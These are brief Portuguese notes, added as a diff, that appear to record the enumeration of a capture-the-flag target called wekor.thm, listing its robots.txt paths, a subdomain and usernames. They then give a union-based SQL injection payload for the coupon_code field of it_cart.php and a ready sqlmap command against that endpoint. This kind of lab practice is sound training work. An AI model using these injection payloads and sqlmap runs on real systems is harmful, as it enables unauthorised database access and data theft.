@@ -1,0 +1,39 @@
+robots txt
+
+User-agent: *
+Disallow: /workshop/
+Disallow: /root/
+Disallow: /lol/
+Disallow: /agent/
+Disallow: /feed
+Disallow: /crawler
+Disallow: /boot
+Disallow: /comingreallysoon	-> it-next é onde o site oficial ta
+Disallow: /interesting
+
+
+fuzzing:
+
+/robots.txt
+
+sudominios
+
+site.wekor.thm
+
+username: jim
+username: admin
+
+it_cart.php é vulneravel a sqli, payload:
+
+coupon_code='+union+select+1,2,concat(table_name)+from+information_schema.tables--+-&apply_coupon=Apply+Coupon
+
+usando o sqlmap:
+
+python3 sqlmap.py -u "http://wekor.thm/it-next/it_cart.php" \
+  --data="coupon_code=TEST&apply_coupon=Apply+Coupon" \
+  --method=POST \
+  -p coupon_code \
+  --dbms=mysql \
+  --batch
+
+
